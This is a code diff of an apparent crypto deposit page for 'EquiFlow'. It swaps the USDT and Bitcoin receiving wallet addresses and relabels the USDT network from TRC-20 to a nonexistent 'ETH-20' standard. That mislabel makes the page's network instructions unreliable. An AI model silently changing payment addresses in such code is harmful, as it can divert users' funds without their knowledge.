@@ -249,7 +249,7 @@
             <div class="mt-radio" id="radio-usdt"></div>
             <div class="mt-info">
               <div class="mt-name">USDT</div>
-              <div class="mt-net">Tron (TRC-20) Network</div>
+              <div class="mt-net">Ethereum (ETH-20) Network</div>
             </div>
           </div>
           <div class="method-tab" id="tab-btc" onclick="selectMethod('btc')">
@@ -263,16 +263,16 @@
 
         <!-- Wallet panel -->
         <div class="wallet-panel show" id="wallet-panel">
-          <div class="wallet-label" id="wallet-label">Initiate transfer to your designated EquiFlow custodial wallet — USDT (TRC-20):</div>
+          <div class="wallet-label" id="wallet-label">Initiate transfer to your designated EquiFlow custodial wallet — USDT (ETH-20):</div>
           <div class="wallet-addr-wrap">
-            <div class="wallet-addr" id="wallet-addr">TGzQw9eQdXNRmSKpvM3X8WdFjN7BqRmUTL</div>
+            <div class="wallet-addr" id="wallet-addr">0x606CC3bC301cC469414191385094AE0Cb2835700</div>
             <button class="copy-btn" id="copy-btn" onclick="copyAddr()">
               <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
               Copy
             </button>
           </div>
           <div class="wallet-note">
-            <strong>Network verification required:</strong> Ensure your transfer is initiated exclusively via <span id="note-coin">USDT (TRC-20 network)</span>. Transfers sent on an incorrect network cannot be recovered or redirected by EquiFlow's custodial infrastructure.
+            <strong>Network verification required:</strong> Ensure your transfer is initiated exclusively via <span id="note-coin">USDT (ETH-20 network)</span>. Transfers sent on an incorrect network cannot be recovered or redirected by EquiFlow's custodial infrastructure.
           </div>
         </div>
       </div>
@@ -345,8 +345,8 @@
 
   /* ── Wallet addresses (admin configures in real deployment) ── */
   var WALLETS = {
-    usdt: { addr: 'TGzQw9eQdXNRmSKpvM3X8WdFjN7BqRmUTL', label: 'Initiate transfer to your designated EquiFlow custodial wallet — USDT (TRC-20):', note: 'USDT (TRC-20 network)' },
-    btc:  { addr: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',  label: 'Initiate transfer to your designated EquiFlow custodial wallet — Bitcoin (BTC):', note: 'Bitcoin (BTC network)' }
+    usdt: { addr: '0x606CC3bC301cC469414191385094AE0Cb2835700', label: 'Initiate transfer to your designated EquiFlow custodial wallet — USDT (ETH-20):', note: 'USDT (ETH-20 network)' },
+    btc:  { addr: 'bc1qanjy6yn4pgdq7a9vhvsu08777t7hfx7szxfc2f',  label: 'Initiate transfer to your designated EquiFlow custodial wallet — Bitcoin (BTC):', note: 'Bitcoin (BTC network)' }
   };
 
   var activeMethod = 'usdt';
